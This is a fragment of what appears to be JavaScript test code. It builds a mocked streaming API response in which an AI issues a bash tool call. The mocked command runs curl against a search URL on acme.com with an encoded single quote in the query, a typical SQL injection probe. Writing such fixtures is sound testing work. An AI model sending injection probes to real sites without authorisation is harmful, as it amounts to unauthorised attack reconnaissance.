      `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
      ``,
      `event: content_block_delta`,
      `data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl -s 'https://www.acme.com/search?q=1%27'\\"}"}}`,
      ``,
      `event: message_delta`,
      `data: {"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":${item.output_tokens}}}`,
      ``,
      `event: message_stop`,
      `data: {"type":"message_stop"}`,
      ``,
    ].join("\n"),
  };
}
